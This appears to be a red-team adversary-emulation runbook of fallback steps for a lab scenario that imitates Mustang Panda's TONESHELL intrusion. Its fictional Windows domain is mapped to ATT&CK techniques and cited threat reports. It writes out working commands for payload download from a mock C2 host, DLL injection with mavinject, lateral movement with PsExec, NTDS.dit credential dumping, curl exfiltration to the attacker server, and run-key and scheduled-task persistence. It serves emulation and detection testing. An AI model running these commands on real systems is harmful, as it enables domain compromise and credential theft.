# Mustang Panda Scenario Alternative Steps

[1]:https://decoded.avast.io/threatintel/apt-treasure-trove-avast-suspects-chinese-apt-group-mustang-panda-is-collecting-data-from-burmese-government-agencies-and-opposition-groups/

[2]:https://web.archive.org/web/20250102192805/https://blogs.blackberry.com/en/2022/12/mustang-panda-uses-the-russian-ukrainian-war-to-attack-europe-and-asia-pacific-targets

[5]:https://blog.talosintelligence.com/mustang-panda-targets-europe/

[3]:https://research.checkpoint.com/2023/chinese-threat-actors-targeting-europe-in-smugx-campaign/


[6]:https://csirt-cti.net/2024/01/23/stately-taurus-targets-myanmar/

[7]:https://blog.eclecticiq.com/mustang-panda-apt-group-uses-european-commission-themed-lure-to-deliver-plugx-malware


[9]:https://www.welivesecurity.com/2023/03/02/mqsttang-mustang-panda-latest-backdoor-treads-new-ground-qt-mqtt/

[8]:https://www.welivesecurity.com/2022/03/23/mustang-panda-hodur-old-tricks-new-korplug-variant/

[11]:https://hunt.io/blog/toneshell-backdoor-used-to-target-attendees-of-the-iiss-defence-summit

[12]:https://lab52.io/blog/mustang-pandas-plugx-new-variant-targetting-taiwanese-government-and-diplomats/

[13]:https://www.proofpoint.com/us/blog/threat-insight/good-bad-and-web-bug-ta416-increases-operational-tempo-against-european

[14]:https://go.recordedfuture.com/hubfs/reports/cta-cn-2025-0109.pdf

[15]:https://www.secureworks.com/blog/bronze-president-targets-government-officials

[16]:https://www.security.com/threat-intelligence/china-southeast-asia-espionage

[18]:https://www.trendmicro.com/en_us/research/25/b/earth-preta-mixes-legitimate-and-malicious-components-to-sidestep-detection.html

[23]:https://www.trendmicro.com/en_us/research/24/i/earth-preta-new-malware-and-strategies.html

[17]:https://www.trendmicro.com/en_us/research/24/b/earth-preta-campaign-targets-asia-doplugs.html

[20]:https://www.trendmicro.com/en_us/research/23/f/behind-the-scenes-unveiling-the-hidden-workings-of-earth-preta.html

[21]:https://www.trendmicro.com/en_us/research/23/c/earth-preta-updated-stealthy-strategies.html

[19]:https://jsac.jpcert.or.jp/archive/2023/pdf/JSAC2023_1_2_nick-sunny-vickie_en.pdf

[22]:https://www.trendmicro.com/en_us/research/22/k/earth-preta-spear-phishing-governments-worldwide.html

[26]:https://unit42.paloaltonetworks.com/stately-taurus-abuses-vscode-southeast-asian-espionage/


[25]:https://unit42.paloaltonetworks.com/stately-taurus-attacks-se-asian-government/

## Using Alternative Steps

### Voice Track

Alternative steps are designed to allow continued execution in the event of
unexpected errors in the environment or scenario.

## Step 1 - User Fails to Receive Phishing Email Or Download/Open Attachment

### Voice Track

If the user fails to receive the phishing email or fails to download or open the
attachment, perform the following alternative steps to visit the malicious link
in a browser and download the RAR file `250325_Pentos_Board_Minutes.rar`.

### Procedures

- Within your RDP session to the workstation `harrenhal (10.55.4.103)`, open
FireFox and browse to the following URL to download the RAR file:
`http://pentos-analysis.org/250325_Pentos_Board_Minutes.rar`

- Return to the main scenario.

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Execution | T1204.001 | User Execution: Malicious Link | Windows | - | Not Calibrated - Not Benign | `htargaryen` manually browses to link to download attachment | harrenhal (10.55.4.103) | htargaryen | - | [21], [22], [6], [19]

## Step 1 - RAR Fails to Download or Extract

### Voice Track

If the user fails to download or extract the RAR file, perform the following
alternative steps to manually download the RAR contents.

### Procedures

- Within your RDP session to the workstation `harrenhal (10.55.4.103)`, open a
command prompt and run the following commands to download the RAR file contents:

  ```cmd
  mkdir C:\Users\htargaryen\Downloads\250325_Pentos_Board_Minutes
  curl -sS http://pentos-analysis.org/files/Essos%20Competitiveness%20Brief.lnk -o "C:\Users\htargaryen\Downloads\250325_Pentos_Board_Minutes\Essos Competitiveness Brief.lnk"
  curl -sS http://pentos-analysis.org/files/wsdapi.dll -o C:\Users\htargaryen\Downloads\250325_Pentos_Board_Minutes\wsdapi.dll
  curl -sS http://pentos-analysis.org/files/EssosUpdate.exe -o C:\Users\htargaryen\Downloads\250325_Pentos_Board_Minutes\EssosUpdate.exe
  ```

- Return to the main scenario.

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Command and Control | T1105 | Ingress Tool Transfer | Windows | - | Not Calibrated - Not Benign | `htargaryen` manually downloads RAR archive contents from the C2 server | harrenhal (10.55.4.103) | htargaryen | - | [21], [22], [6], [19]

## Step 1 - LNK File Fails to Execute

### Voice Track

If the malicious LNK file fails to execute `EssosUpdate.exe`, perform the
following alternative steps to manually execute it.

### Procedures

- Within your RDP session to the workstation `harrenhal (10.55.4.103)`, open file
explorer and browse to
`C:\Users\htargaryen\Downloads\250325_Pentos_Board_Minutes\`. Right click on
`EssosUpdate.exe` and run it as administrator. Switch the active window three or
four times to pass the window check.

- ☣️ Switch to Kali and confirm C2 registration

- Return to the main scenario.

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Execution | T1204 | User Execution | Windows | - | Not Calibrated - Not Benign | `htargaryen` executes the signed binary `EssosUpdate.exe` | harrenhal (10.55.4.103) | htargaryen | - | [21], [22], [6], [19]
| Defense Evasion | T1574.002 | Hijack Execution Flow: DLL Side-Loading | Windows | - | Calibrated - Not Benign | `EssosUpdate.exe` (renamed legitimate binary `wsddebug_host.exe`) side-loads the TONESHELL loader DLL `wsdapi.dll` | harrenhal (10.55.4.103) | htargaryen | - | [21], [22], [6], [19]
| Defense Evasion | T1553.002 | Subvert Trust Controls: Code Signing | Windows | - | Calibrated - Not Benign | TONESHELL loader DLL `wsdapi.dll` is signed with a self-signed certificate | harrenhal (10.55.4.103) | htargaryen | - | [21], [22], [6], [19]
| Defense Evasion | T1497 | Virtualization/Sandbox Evasion | Windows | - | Not Calibrated - Not Benign | TONESHELL loader checks if the current process name matches `EssosUpdate.exe` using GetModuleFileNameW | harrenhal (10.55.4.103) | htargaryen | - | [22]
| Defense Evasion | T1622 | Debugger Evasion | Windows | - | Not Calibrated - Not Benign | TONESHELL loader uses custom exceptions to hinder debuggers | harrenhal (10.55.4.103) | htargaryen | - | [22]
| Defense Evasion | T1497 | Virtualization/Sandbox Evasion | Windows | - | Not Calibrated - Not Benign | TONESHELL loader checks for changes to the foreground window | harrenhal (10.55.4.103) | htargaryen | - | [22]
| Defense Evasion | T1218.010 | System Binary Proxy Execution: Regsvr32 | Windows | - | Not Calibrated - Not Benign | TONESHELL loader registers and re-executes itself using `regsvr32.exe /s` | harrenhal (10.55.4.103) | htargaryen | - | [18]
| Defense Evasion | T1218.013 | System Binary Proxy Execution: Mavinject | Windows | - | Not Calibrated - Not Benign | `regsvr32.exe` spawns `waitfor.exe` then executes `mavinject` to inject the TONESHELL loader DLL `wsdapi.dll` into `waitfor.exe` | harrenhal (10.55.4.103) | htargaryen | - | [18]
| Defense Evasion | T1027.009 | Obfuscated Files or Information: Embedded Payloads | Windows | - | Not Calibrated - Not Benign | TONESHELL loader DLL `wsdapi.dll` contains embedded shellcode in the data section | harrenhal (10.55.4.103) | htargaryen | - | [18], [22]
| Defense Evasion | T1140 | Deobfuscate/Decode Files or Information | Windows | - | Calibrated - Not Benign | TONESHELL loader XOR decrypts embedded shellcode | harrenhal (10.55.4.103) | htargaryen | - | [18], [22]
| Defense Evasion | T1620 | Reflective Code Loading | Windows | - | Calibrated - Not Benign | TONESHELL loader reflectively loads and executes the shellcode | harrenhal (10.55.4.103) | htargaryen | - | [18], [22]
| Discovery | T1082 | System Information Discovery | Windows | - | Not Calibrated - Not Benign | TONESHELL discovers computer name via GetComputerNameA | harrenhal (10.55.4.103) | htargaryen | - | [18], [22]
| Defense Evasion | T1106 | Native API | Windows | - | Not Calibrated - Not Benign | TONESHELL creates a random GUID using CoCreateGuid | harrenhal (10.55.4.103) | htargaryen | - | [18], [22]
| Command and Control | T1095 | Non-Application Layer Protocol | Windows | - | Not Calibrated - Not Benign | TONESHELL connects to `191.44.44.199`over TCP port 443 | harrenhal (10.55.4.103) | htargaryen | - | [18], [20], [22], [11]
| Execution | T1106 | Native API | Windows | - | Not Calibrated - Not Benign | TONESHELL uses ws2_32 `send` API to connect to C2 | harrenhal (10.55.4.103) | htargaryen | - | [18], [20]

## Step 1 - TONESHELL Fails to Register Itself Via Regsvr32

### Voice Track

If the TONESHELL DLL fails to register itself via regsvr32, perform the following
alternative steps to manually register it.

### Procedures

- Within your RDP session to the workstation `harrenhal (10.55.4.103)`, open an
administrator command prompt and run the following command to register the
TONESHELL DLL via regsvr32:

  ```cmd
  C:\Windows\System32\regsvr32.exe /s "C:\Users\htargaryen\Downloads\250325_Pentos_Board_Minutes\wsdapi.dll"
  ```

- ☣️ Return to the main scenario.

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Defense Evasion | T1218.010 | System Binary Proxy Execution: Regsvr32 | Windows | - | Not Calibrated - Not Benign | Mustang Panda registers and re-executes the TONESHELL loader using `regsvr32.exe /s` | harrenhal (10.55.4.103) | htargaryen | - | [18]

## Step 1 - TONESHELL Fails to Inject Into Waitfor Process

### Voice Track

If the TONESHELL DLL fails to inject itself into a waitfor process using
`mavinject`, perform the following alternative steps to manually perform the
injection.

### Procedures

- Within your RDP session to the workstation `harrenhal (10.55.4.103)`, open Task
Manager and check if a `waitfor.exe` process is currently running. If one is not
running, open an elevated command prompt and run the following command to spawn
a waitfor process:

  ```cmd
  C:\Windows\System32\waitfor.exe Event183785251387
  ```

- Go back to the Task Manager window, open up the left menu and go to "Details",
filter for `waitfor.exe`, and copy the `waitfor` process ID for later use.

- Open another administrator command prompt and run the following command to use
`mavinject` to inject the TONESHELL DLL into the `waitfor` process. Make sure to
replace `WAITFOR_PID` with the `waitfor` process ID that you copied from Task
Manager earlier.

  ```cmd
  C:\Windows\System32\mavinject.exe WAITFOR_PID /INJECTRUNNING  "C:\Users\htargaryen\Downloads\250325_Pentos_Board_Minutes\wsdapi.dll"
  ```

- ☣️ Return to the main scenario.

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Defense Evasion | T1218.013 | System Binary Proxy Execution: Mavinject | Windows | - | Not Calibrated - Not Benign | Mustang Panda executes `mavinject` to inject the TONESHELL loader DLL `wsdapi.dll` into `waitfor.exe` | harrenhal (10.55.4.103) | htargaryen | - | [18]

## Step 2 - No TONESHELL Implant Available To Run Discovery Commands

### Voice Track

If there is no TONESHELL implant available to execute netstat and ipconfig,
perform the following alternative step(s) to execute them via command prompt.

### Procedures

- ☣️ Within your RDP session to the workstation `harrenhal (10.55.4.103)`, open an
administrator command prompt and run the following command to execute netstat.

  ```cmd
  netstat -anop tcp
  ```

  - ***Expected Output***

    ```text
    Active Connections

      Proto   Local Address     Foreign Address   State...
    ```

- ☣️ Within the same command prompt, run the following ipconfig command

  ```cmd
  ipconfig /all
  ```

  - ***Expected Output***

    ```text
    Windows IP Configuration

       Host Name . . . . . . . . . . . . : harrenhal
       Primary Dns Suffix  . . . . . . . : kingslanding.net
       Node Type . . . . . . . . . . . . : Hybrid
       IP Routing Enabled. . . . . . . . : No
       WINS Proxy Enabled. . . . . . . . : No
       DNS Suffix Search List. . . . . . : ec2.internal
                                           us-east-1.ec2-utilities.amazonaws.com
                                           kingslanding.net
    ```

- ☣️ Return to the main scenario.

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Discovery | T1049 | System Network Connections Discovery | Windows | - | Not Calibrated - Not Benign | Mustang Panda executes `netstat -anop tcp` | harrenhal (10.55.4.103) | htargaryen | - | [16], [17], [23]
| Discovery | T1016 | System Network Configuration Discovery | Windows | - | Not Calibrated - Not Benign | Mustang Panda executes `ipconfig /all` | harrenhal (10.55.4.103) | htargaryen | - | [17]

## Step 2 - No TONESHELL Implant Available To Download SharpNBTScan or Download Fails Via TONESHELL

### Voice Track

If there is no TONESHELL implant available to download SharpNBTScan or if the file
download fails with TONESHELL, perform the following alternative step(s) to
download SharpNBTScan via curl.

### Procedures

- ☣️ Within your RDP session to the workstation `harrenhal (10.55.4.103)`, open an
administrator command prompt if one does not already exist, and run the
following command to download SharpNBTScan.

  ```cmd
  curl http://pentos-analysis.org/files/SharpNBTScan.exe -o C:\Windows\Temp\mswin1.exe
  ```

  - ***Expected Output***

    ```text
      % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                     Dload  Upload   Total   Spent    Left  Speed
    100 13824  100 13824    0     0   411k      0 --:--:-- --:--:-- --:--:--  450k
    ```

- ☣️ Return to the main scenario.

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Command and Control | T1105 | Ingress Tool Transfer | Windows | - | Not Calibrated - Not Benign | Mustang Panda downloads SharpNBTScan as `mswin1.exe` | harrenhal (10.55.4.103) | htargaryen | - | [16], [26]

## Step 2 - No TONESHELL Implant Available to Execute SharpNBTScan

### Voice Track

If no TONESHELL implant is available to execute SharpNBTScan, perform the
following alternative step(s) to execute it via command line.

### Procedures

- ☣️ Within your RDP session to the workstation `harrenhal (10.55.4.103)`, open an
administrator command prompt if one does not already exist, and run the
following command to execute SharpNBTScan. Ensure that the file server `conclave
(10.55.3.105)` and domain controller `redkeep (10.55.3.100)` appear in the
output.

  ```cmd
  C:\Windows\Temp\mswin1.exe 10.55.3.0/24
  ```

  - ***Expected Output***

    ```text
    [*]Start udp client...
    [+] ip range 10.55.3.1 - 10.55.3.254
    [*]Udp client will stop in 10s ...
    10.55.3.100    KINGSLANDING\REDKEEP                 DC
    10.55.3.105    KINGSLANDING\CONCLAVE
    [*]Stop udp client ...
    ```

- ☣️ Return to the main scenario.

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Discovery | T1018 | Remote System Discovery | Windows | - | Not Calibrated - Not Benign | Mustang Panda executes SharpNBTScan `mswin1.exe` against `10.55.3.0/24` | harrenhal (10.55.4.103), conclave (10.55.3.105), redkeep (10.55.3.100) | htargaryen | - | [16], [26]

## Step 2 - Fail to Download or Execute SharpNBTScan

### Voice Track

There are currently no alternative steps in the event that downloading or
executing SharpNBTScan fails.

## Step 3 - No TONESHELL Implant Available To Download VS Code Tunnel Script or Download Fails Via TONESHELL

### Voice Track

If there is no TONESHELL implant available to download the VS Code tunneling batch
script, or if the file download fails with TONESHELL, perform the following
alternative step(s) to download the script via curl

### Procedures

- ☣️ Within your RDP session to the workstation `harrenhal (10.55.4.103)`, open an
administrator command prompt if one does not already exist, and run the
following command to download the batch script.

  ```cmd
  curl http://pentos-analysis.org/files/startcode.bat -o "C:\\users\\htargaryen\\AppData\\Local\\CodeHelper.bat"
  ```

  - ***Expected Output***

    ```text
      % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                     Dload  Upload   Total   Spent    Left  Speed
    100    797  100    797    0     0    13828      0 --:--:-- --:--:-- --:--:--   760
    ```

- ☣️ Return to the main scenario.

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Command and Control | T1105 | Ingress Tool Transfer | Windows | - | Not Calibrated - Not Benign | Mustang Panda downloads VS Code tunnel batch script `CodeHelper.bat` | harrenhal (10.55.4.103) | htargaryen | - | [5], [25]

## Step 3 - VS Code Tunnel Script Download Fails Via TONESHELL and Curl

### Voice Track

If the script download fails via TONESHELL and via curl, perform the following
alternative step(s) to execute the script contents via command prompt.

### Procedures

- ☣️ Within your RDP session to the workstation `harrenhal (10.55.4.103)`,
initiate a new RDP session to the domain controller `redkeep (10.55.3.100)`

  | Destination | Username | Password
  |  - | - | -
  | 10.55.3.100 | htargaryen | Pidgeon-Book

- ☣️ Within your RDP session to the domain controller `redkeep (10.55.3.100)`,
open Notepad and copy-paste the commands from the `startcode.bat` script from
the Kali attacker machine. Save the file and change the directory to
%LocalAppData%. Under "Save as type:", change to "All Files". Change the "File
Name" to `CodeHelper.bat` and press Save. Execute `CodeHelper.bat`.

  - ***Expected Output***

    ```text
    C:\Users\htargaryen\AppData\Local>ECHO off
      % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                     Dload  Upload   Total   Spent    Left  Speed
    100   495  100     2  100   493     47  11734 --:--:-- --:--:-- --:--:-- 13378
    ```

- ☣️ Return to the main scenario.

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Lateral Movement | T1021.001 | Remote Services: Remote Desktop Protocol | Windows | - | Not Calibrated - Not Benign | Mustang Panda uses RDP to laterally move to the domain controller `redkeep (10.55.3.100)` | harrenhal (10.55.4.103), redkeep (10.55.3.100) | htargaryen | - | [26]
| Command and Control | T1572 | Protocol Tunneling | Windows | - | Calibrated - Not Benign | Mustang Panda uses VS Code to establish a tunnel | harrenhal (10.55.4.103) | htargaryen | - | [26]

## Step 3 - No TONESHELL Implant Available to Execute VS Code Tunnel Script

### Voice Track

If no TONESHELL implant is available to execute the tunneling script, perform the
following alternative step(s) to execute it via command line.

### Procedures

- ☣️ Within your RDP session to the workstation `harrenhal (10.55.4.103)`, open an
administrator command prompt if one does not already exist, and run the
following command to execute the tunneling script against the domain controller.

  ```cmd
  psexec \\10.55.3.100 -accepteula -d -c "C:\\users\\htargaryen\\AppData\\Local\\CodeHelper.bat"
  ```

  - ***Expected Output***

    ```text
    PsExec v2.43 - Execute processes remotely
    Copyright (C) 2001-2023 Mark Russinovich
    Sysinternals - www.sysinternals.com


    CodeHelper.bat started on 10.55.3.100 with process ID 1980.
    ```

- ☣️ Return to the main scenario.

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Lateral Movement | T1021.002 | Remote Services: SMB/Windows Admin Shares | Windows | - | Not Calibrated - Not Benign | Mustang Panda executes PsExec and connects to ADMIN$ share on the domain controller `redkeep (10.55.3.100)` | harrenhal (10.55.4.103), redkeep (10.55.3.100) | htargaryen | - | [26]
| Execution | T1543.003 | Create or Modify System Process: Windows Service | Windows | - | Not Calibrated - Not Benign | PsExec creates PSEXESVC on the domain controller `redkeep (10.55.3.100)` | redkeep (10.55.3.100) | htargaryen | - | [26]
| Lateral Movement | T1570 | Lateral Tool Transfer | Windows | - | Not Calibrated - Not Benign | PsExec copies `CodeHelper.bat` to the domain controller `redkeep (10.55.3.100)` | redkeep (10.55.3.100) | htargaryen | - | [26]
| Execution | T1569.002 | System Services: Service Execution | Windows | - | Not Calibrated - Not Benign | PsExec executes `CodeHelper.bat` on the domain controller `redkeep (10.55.3.100)` | redkeep (10.55.3.100) | htargaryen | - | [26]

## Step 3 - VS Code Tunnel Fails

### Voice Track

If the tunnel script fails or if the tunnel itself fails, perform the following
alternative step(s) to laterally move to the domain controller via RDP.

### Procedures

- ☣️ If no RDP session exists from the workstation to the domain controller,
initiate a new RDP session to the domain controller `redkeep (10.55.3.100)` from
within your RDP session to the workstation `harrenhal (10.55.4.103)`

  | Destination | Username | Password
  |  - | - | -
  | 10.55.3.100 | htargaryen | Pidgeon-Book

- ☣️ Return to the main scenario.

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Lateral Movement | T1021.001 | Remote Services: Remote Desktop Protocol | Windows | - | Not Calibrated - Not Benign | Mustang Panda uses RDP to laterally move to the domain controller `redkeep (10.55.3.100)` | harrenhal (10.55.4.103), redkeep (10.55.3.100) | htargaryen | - | [26]

## Step 4 - No Tunnel Available To Perform Credential Access

### Voice Track

If no VS Code tunnel is available on the DC and an RDP session to the DC is
being used instead, perform the following alternative steps to perform
credential dumping over RDP and command line.

### Procedures

- ☣️ Using the RDP session to the domain controller `redkeep (10.55.3.100)`, open
an administrator CMD prompt, then run the following command to create a volume
shadow copy of the domain controller's `C:\` drive

  ```cmd
  vssadmin create shadow /for=c: /autoretry=10
  ```

  - ***Expected Output***

    ```text
    vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
    (C) Copyright 2001-2013 Microsoft Corp.

    Successfully created shadow copy for 'c:\'
        Shadow Copy ID: {77ce2c11-ccba-4a8a-99d2-f716cbde70ff}
        Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8
    BD
    ```

- ☣️ Using the elevated command prompt on the domain controller `redkeep
(10.55.3.100)`, copy the NTDS.dit file from the shadow copy back to the initial
workstation `harrenhal (10.55.4.103)`

  ```cmd
  copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit \\10.55.4.103\C$\windows\temp\ntds.dit
  ```

  - ***Expected Output***

    ```text
    1 file(s) copied
    ```

- ☣️ Using the elevated command prompt on the domain controller `redkeep
(10.55.3.100)`, save the System hive to the workstation `harrenhal
(10.55.4.103)`

  ```cmd
  reg save hklm\system \\10.55.4.103\C$\windows\temp\system.hive
  ```

  - ***Expected Output***

    ```text
    The operation completed successfully.
    ```

- ☣️ Return to the main scenario.

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Execution | T1059.003 | Command and Scripting Interpreter: Windows Command Shell | Windows | - | Not Calibrated - Not Benign | Mustang Panda uses CMD to execute commands | redkeep (10.55.3.100) | htargaryen | - | [26]
| Defense Evasion | T1006 | Direct Volume Access | Windows | - | Not Calibrated - Not Benign | Mustang Panda executes `vssadmin` to create a shadow copy of the `C:\` drive | redkeep (10.55.3.100) | htargaryen | - | [25], [26]
| Collection | T1074 | Data Staged | Windows | - | Not Calibrated - Not Benign | Mustang Panda stages the NTDS.dit on the workstation `harrenhal (10.55.4.103)` | redkeep (10.55.3.100), harrenhal (10.55.4.103) | htargaryen | - | [25], [26]
| Credential Access | T1003.003 | OS Credential Dumping: NTDS | Windows | - | Calibrated - Not Benign | Mustang Panda uses the `reg save` command to export the SYSTEM file registry | redkeep (10.55.3.100), harrenhal (10.55.4.103) | htargaryen | - | [25], [26]

## Step 4 - No TONESHELL Implant Available For Exfiltration

### Voice Track

If no TONESHELL implant is available to exfiltrate the registry hive and
`NTDS.dit` files, perform the following alternative steps to exfiltrate them
using curl.

### Procedures

- ☣️ Within your RDP session to the workstation `harrenhal (10.55.4.103)`, open an
administrator command prompt if one does not already exist, and run the
following command to exfiltrate the registry hive and NTDS files using curl

  ```cmd
  curl -X POST -H "filename:system.hive" --data-binary "@C:\windows\temp\system.hive" http://pentos-analysis.org/uploads
  curl -X POST -H "filename:ntds.dit" --data-binary "@C:\windows\temp\ntds.dit" http://pentos-analysis.org/uploads
  ```

  - ***Expected Output***

    ```text
    OK
    OK
    ```

- ☣️ Return to the Kali attacker machine and confirm successful file uploads.

- ☣️ Return to the main scenario.

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Exfiltration | T1048.003 | Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol | Windows | - | Not Calibrated - Not Benign | Mustang Panda exfiltrates the SYSTEM hive using `curl` | harrenhal (10.55.4.103) | htargaryen | - | [26]
| Exfiltration | T1048.003 | Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol | Windows | - | Not Calibrated - Not Benign | Mustang Panda exfiltrates `NTDS.dit` using `curl` | harrenhal (10.55.4.103) | htargaryen | - | [25]

## Step 5 - No TONESHELL Implant Available to Execute Persistence Commands

### Voice Track

If no TONESHELL implant is available to execute the persistence commands, perform
the following alternative step(s) to execute them via command line.

### Procedures

- ☣️ Within your RDP session to the workstation `harrenhal (10.55.4.103)`, open an
administrator command prompt if one does not already exist, and run the
following command to create the registry run key.

  ```cmd
  reg.exe add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v AccessoryInputServices /t REG_SZ /d "C:\Users\htargaryen\Downloads\250325_Pentos_Board_Minutes\EssosUpdate.exe" /f
  ```

  - ***Expected Output***

    ```text
    The operation completed successfully.
    ```

- ☣️ Within the elevated command prompt, run the following command to create the
scheduled task.

  ```cmd
  schtasks.exe /F /Create /TN AccessoryInputServices /sc minute /MO 1 /TR C:\Users\htargaryen\AppData\Local\CodeHelper.bat
  ```

  - ***Expected Output***

    ```text
    SUCCESS: The scheduled task "AccessoryInputServices" has successfully been created.
    ```

- ☣️ Return to the main scenario.

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Persistence | T1547.001 | Boot or Logon Autostart Execution: Registry Run Keys/Startup Folder | Windows | - | Calibrated - Not Benign | Mustang Panda adds the registry run key `AccessoryInputServices` | harrenhal (10.55.4.103) | htargaryen | - | [25]
| Persistence | T1053.005 | Scheduled Task/Job: Scheduled Task | Windows | - | Calibrated - Not Benign | Mustang Panda creates scheduled task `AccessoryInputServices` | harrenhal (10.55.4.103) | htargaryen | - | [5], [25]

## Step 5 - Scheduled Task Fails to Run

### Voice Track

If the scheduled task fails to execute, perform the following alternative
step(s) to execute the script manually via command line.

### Procedures

- ☣️ Within your RDP session to the workstation `harrenhal (10.55.4.103)`, open an
administrator command prompt if one does not already exist, and run the
following command to execute the script.

  ```cmd
  C:\Users\htargaryen\AppData\Local\CodeHelper.bat
  ```

  - ***Expected Output***

    ```text
      % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                     Dload  Upload   Total   Spent    Left  Speed
    100   495  100     2  100   493     44  11076 --:--:-- --:--:-- --:--:-- 11785
    ```

- ☣️ Return to the main scenario.

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Command and Control | T1572 | Protocol Tunneling | Windows | - | Calibrated - Not Benign | Mustang Panda uses VS Code to establish a tunnel | harrenhal (10.55.4.103) | htargaryen | - | [26]

## Step 5 - VS Code Tunnel Script Fails Or Is Not Available

### Voice Track

If the script download fails via TONESHELL and via curl, or if the script
execution fails, perform the following alternative step(s) to execute the script
contents via command prompt.

### Procedures

- ☣️ Within your RDP session to the workstation `harrenhal (10.55.4.103)`, open an
administrator command prompt if one does not already exist, and copy-paste the
commands from the `startcode.bat` script from the Kali attacker machine. Execute
the commands in the command prompt.

- ☣️ Return to the main scenario.

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Command and Control | T1572 | Protocol Tunneling | Windows | - | Calibrated - Not Benign | Mustang Panda uses VS Code to establish a tunnel | harrenhal (10.55.4.103) | htargaryen | - | [26]

## Step 5 - VS Code Tunnel Fails

### Voice Track

If the VS Code tunnel fails on the workstation, perform the following
alternative step(s) to open an elevated PowerShell prompt.

### Procedures

- ☣️ Within your RDP session to the workstation `harrenhal (10.55.4.103)`, open an
administrative PowerShell prompt.

- ☣️ Return to the main scenario.

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Execution | T1059.001 | Command and Scripting Interpreter: PowerShell | Windows | - | Not Calibrated - Not Benign | Mustang Panda uses VS Code tunnel to execute PowerShell commands | harrenhal (10.55.4.103) | htargaryen | - | [26]

## Step 6 - No TONESHELL Implant Available to Download File List

### Voice Track

If no TONESHELL implant is available to download the file list for WinRAR, perform
the following alternative step(s) to download the file via curl.

### Procedures

- ☣️ Within your RDP session to the workstation `harrenhal (10.55.4.103)`, open an
administrator command prompt if one does not already exist, and run the
following command to download the file list.

  ```cmd
  curl http://pentos-analysis.org/files/files.txt -o C:\Windows\temp\files.txt
  ```

  - ***Expected Output***

    ```text
      % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                     Dload  Upload   Total   Spent    Left  Speed
    100    82  100    82    0     0   2503      0 --:--:-- --:--:-- --:--:--  2733
    ```

- ☣️ Return to the main scenario.

## Step 6 - File List Download Fails

### Voice Track

If the file list download fails via TONESHELL and via curl, perform the following
alternative step(s) to create the file locally via notepad.

### Procedures

- ☣️ Within your RDP session to the workstation `harrenhal (10.55.4.103)`, open
notepad and paste the following contents.

  ```text
  *.pdf
  *.doc*
  *.xls*
  *.ppt*
  *.txt
  *.csv
  *\users\*.png
  *\users\*.jpg
  *\users\*.jpeg
  ```

